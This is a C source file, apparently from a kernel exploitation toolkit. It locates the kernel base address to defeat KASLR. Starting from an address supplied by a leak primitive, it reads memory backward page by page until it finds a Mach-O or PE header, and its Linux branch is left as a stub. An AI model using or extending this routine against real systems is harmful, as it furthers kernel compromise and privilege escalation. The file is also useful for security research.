#include <stdio.h>
#include <stdint.h>

#ifdef __APPLE__
#include <mach-o/loader.h>
#include <mach/mach.h>
#endif

#include <localUtil.h>
#include <drv_share.h>

// ========================================
// ========== ARCHITECTURE SWITCH =========
// ========================================
#if defined(__arm64__)
#include <hdeA64.h>
#define hde_local hdeA64_t
#elif defined(__x86_64__)
#include <hde.h>
#define hde_local hde64s_t
#elif defined(__arm__)
#define hde_local int
#define parseInst(x, y)
#warning no arm kbase support
#endif
#include "krw_util.h"

// ========================================
// ============== OS SWITCH ===============
// ========================================
#ifdef __APPLE__
#define HEADER_MAGIC (MH_MAGIC_64)
#elif defined(_WIN32)
#define HEADER_MAGIC (IMAGE_DOS_SIGNATURE | 0x00900000)
#define __attribute__(x)
#endif

#if defined(__APPLE__) || defined(_WIN32)
#define HEAD_BUF_SZ     4
#elif defined(__linux__)
#define HEAD_BUF_SZ     0x60
#endif

__attribute__((weak)) int evaluate_found(uint8_t* buf)
#if defined(__linux__)
{
    int result = -1;
    hde_local instTemp;

    parseInst(buf, &instTemp);
#if defined(__arm64__)
    // if CASE_ARM64_ENC(buf, INSTCODE, BR_ENC)
    // FINISH_IF(instTemp.OP0 == );
#elif defined(__x86_64__)
    // if (instTemp.opcode1 == UNCON_JUMP)
    // {

    // }
#elif defined(__arm__)
#endif // arch check

    goto fail;
finish:
    result = 0;
fail:
    return result;
}
#elif defined(__APPLE__) || defined (_WIN32)
{
    int result = -1;

    FINISH_IF(*(uint32_t*)buf == HEADER_MAGIC);
    
    goto fail;
finish:
    result = 0;
fail:
    return result;
}
#endif

// kbaseroll macros happen in 4 stages, incase it needs to be broken up
    // includes
    // variable definitions
    // presets before loop
    // comparator for a valid header
__attribute__((weak)) int kBaseRoll(size_t* kbase_a)
{
    int result = -1;
    size_t leakAddr = 0;
    uint8_t buf[HEAD_BUF_SZ] = {0};

    // kernel_leak
    kernel_leak(&leakAddr);
#ifdef __APPLE__
    leakAddr |= KADDR_MASK;
#endif
    leakAddr &= ~PAGE_MASK4K;
    // mac, ballparks around 0x160?
    for (int i = 0; i < 0x400; i++)
    {
        kernel_read(buf, HEAD_BUF_SZ, leakAddr);
        FINISH_IF(evaluate_found(buf) == 0);
        leakAddr -= PAGE_SIZE4K;
    }

    goto fail;
finish:
    result = 0;
    if (kbase_a != 0)
    {
        *kbase_a = leakAddr;
    }
fail:
    return result;
}
